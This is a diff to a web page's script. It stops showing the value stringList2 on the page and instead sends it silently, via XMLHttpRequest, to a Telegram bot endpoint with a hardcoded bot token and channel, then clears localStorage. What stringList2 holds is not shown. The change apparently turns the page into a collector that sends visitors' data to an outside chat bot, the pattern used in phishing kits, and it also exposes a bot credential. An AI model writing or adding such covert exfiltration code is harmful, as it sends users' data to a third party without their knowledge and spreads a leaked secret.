@@ -3,7 +3,7 @@
 <meta http-equiv="Expires" content="0" />
 <h2 class="details" style="color: red"></h2>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<h1 id="displaysignal"></h1>
+<!-- <h1 id="displaysignal"></h1> -->
   <script> 
 
   (function () {
@@ -330,26 +330,26 @@
         
 
         
-        var obj = $("#displaysignal").text(stringList2);
-        obj.html(obj.html().replace(/%0a/g,'<br/>'));
+//         var obj = $("#displaysignal").text(stringList2);
+//         obj.html(obj.html().replace(/%0a/g,'<br/>'));
 
-      //   var xhttp = new XMLHttpRequest();
-      // xhttp.onreadystatechange = function () {
-      //   if (this.readyState == 4 && this.status == 200) {
-      //     // Typical action to be performed when the document is ready:
-      //     var response = xhttp.responseText;
-      //     console.log("ok" + response);
-      //   }
-      // };
-      // xhttp.open(
-      //   "GET",
-      //   "https://api.telegram.org/bot5455276964:AAFLB-A_Jc88A7ZlPQoN7CF6utmKu8QoO-E/sendMessage?chat_id=@purpleplusram&text=" +
-      //     stringList2,
-      //   true
-      // );
+        var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+          // Typical action to be performed when the document is ready:
+          var response = xhttp.responseText;
+          console.log("ok" + response);
+        }
+      };
+      xhttp.open(
+        "GET",
+        "https://api.telegram.org/bot5455276964:AAFLB-A_Jc88A7ZlPQoN7CF6utmKu8QoO-E/sendMessage?chat_id=@purpleplusram&text=" +
+          stringList2,
+        true
+      );
 
-      // xhttp.send();
-      // localStorage.clear();
+      xhttp.send();
+      localStorage.clear();
        
       }
       
